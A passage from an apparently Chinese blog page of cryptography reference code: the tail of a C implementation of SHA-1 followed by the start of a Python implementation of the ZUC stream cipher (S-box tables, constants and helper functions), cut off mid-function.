    uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Maj(B, C, D) + E + W[t] + K[<span class="hljs-number">2</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">60</span>; t &lt;= <span class="hljs-number">79</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Parity(B, C, D) + E + W[t] + K[<span class="hljs-number">3</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br> <br>        /*  e. Let H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E. */<br>        H0 = H0 + A;<br>        H1 = H1 + B;<br>        H2 = H2 + C;<br>        H3 = H3 + D;<br>        H4 = H4 + E;<br>    &#125;<br> <br>    // step <span class="hljs-number">5</span>: 输出ABCD<br>    uint32_t* pOut = (uint8_t*)out;<br>    pOut[<span class="hljs-number">0</span>] = __bswap_32(H0);<br>    pOut[<span class="hljs-number">1</span>] = __bswap_32(H1);<br>    pOut[<span class="hljs-number">2</span>] = __bswap_32(H2);<br>    pOut[<span class="hljs-number">3</span>] = __bswap_32(H3);<br>    pOut[<span class="hljs-number">4</span>] = __bswap_32(H4);<br>    free(X);<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br> <br><span class="hljs-built_in">int</span> main()<br>&#123;<br>    unsigned char digest[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    sha1(digest, <span class="hljs-string">&quot;Hello World!&quot;</span>, strlen(<span class="hljs-string">&quot;Hello World!&quot;</span>));<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="祖冲之（ZUC"><a href="#祖冲之（ZUC" class="headerlink" title="祖冲之（ZUC)"></a>祖冲之（ZUC)</h1><p>序列密码，参考加解密脚本，需要已知key和iv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br> <br>S0 = [<br>    <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xCB</span>,<br>    <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x90</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xAC</span>,<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x38</span>,<br>    <span class="hljs-number">0x76</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x9B</span>,<br>    <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1C</span>,<br>    <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAD</span>,<br>    <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xC8</span>,<br>    <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x56</span>,<br>    <span class="hljs-number">0x07</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFE</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x5D</span>,<br>    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x23</span>,<br>    <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xF1</span>,<br>    <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x65</span>,<br>    <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x60</span><br>]<br> <br>S1 = [<br>    <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x77</span>,<br>    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xE1</span>,<br>    <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x48</span>,<br>    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x87</span>,<br>    <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xEB</span>,<br>    <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xA9</span>,<br>    <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xE9</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x89</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>,<br>    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDE</span>,<br>    <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x21</span>,<br>    <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x34</span>,<br>    <span class="hljs-number">0x88</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x28</span>,<br>    <span class="hljs-number">0x64</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF2</span><br>]<br> <br>D = [<br>    <span class="hljs-number">0x44D7</span>, <span class="hljs-number">0x26BC</span>, <span class="hljs-number">0x626B</span>, <span class="hljs-number">0x135E</span>, <span class="hljs-number">0x5789</span>, <span class="hljs-number">0x35E2</span>, <span class="hljs-number">0x7135</span>, <span class="hljs-number">0x09AF</span>,<br>    <span class="hljs-number">0x4D78</span>, <span class="hljs-number">0x2F13</span>, <span class="hljs-number">0x6BC4</span>, <span class="hljs-number">0x1AF1</span>, <span class="hljs-number">0x5E26</span>, <span class="hljs-number">0x3C4D</span>, <span class="hljs-number">0x789A</span>, <span class="hljs-number">0x47AC</span><br>]<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addition_uint31</span>(<span class="hljs-params">a, b</span>):<br>    c = a + b<br>    <span class="hljs-keyword">return</span> (c &amp; <span class="hljs-number">0x7FFFFFFF</span>) + (c &gt;&gt; <span class="hljs-number">31</span>)<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl_uint31</span>(<span class="hljs-params">a, shift</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="hljs-number">31</span> - shift))) &amp; <span class="hljs-number">0x7FFFFFFF</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl_uint32</span>(<span class="hljs-params">a, shift</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l1</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (x ^ rotl_uint32(x, <span class="hljs-number">2</span>) ^ rotl_uint32(x, <span class="hljs-number">10</span>) ^ rotl_uint32(x, <span class="hljs-number">18</span>) ^ rotl_uint32(x, <span class="hljs-number">24</span>))<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l2</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (x ^ rotl_uint32(x, <span class="hljs-number">8</span>) ^ rotl_uint32(x, <span class="hljs-number">14</span>) ^ rotl_uint32(x, <span class="hljs-number">22</span>) ^ rotl_uint32(x, <span class="hljs-number">30</span>))<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_uint32</span>(<span class="hljs-params">a, b, c, d</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xffffffff</span>) | ((b &lt;&lt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffffffff</span>) | ((c &lt;&lt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xffffffff</span>) | d<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_uint31</span>(<span class="hljs-params">a, b, c</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0x7fffffff</span>) | ((b &lt;&lt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x7fffffff</span>) | c<br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ZUC</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv</span>):<br>        self.r = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        self.lfsr = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>        self.x = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        self.zuc_init(key, iv)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bit_reorganization</span>(<span class="hljs-params">self</span>):<br>        self.x[<span class="hljs-number">0</span>] = ((self.lfsr[<span class="hljs-number">15</span>] &amp; <span class="hljs-number">0x7FFF8000</span>) &lt;&lt; <span class="hljs-number">1</span>) | (self.lfsr[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">0xFFFF</span>)<br>        self.x[<span class="hljs-number">1</span>] = ((self.lfsr[<span class="hljs-number">11</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">15</span>)<br>        self.x[<span class="hljs-number">2</span>] = ((self.lfsr[<span class="hljs-number">7</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span class="hljs-number">5</span>] &gt;&gt; <span class="hljs-number">15</span>)<br>        self.x[<span class="hljs-number">3</span>] = ((self.lfsr[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">15</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lfsr_next</span>(<span class="hljs-params">self</span>):<br>        f = self.lfsr[<span class="hljs-number">0</span>]<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">0</span>], <span class="hljs-number">8</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">4</span>], <span class="hljs-number">20</span>)<br>        f = addition_uint31(f, v)<br>        v = rotl_uint31(self.lfsr[<span class="hljs-number">10</span>], <span 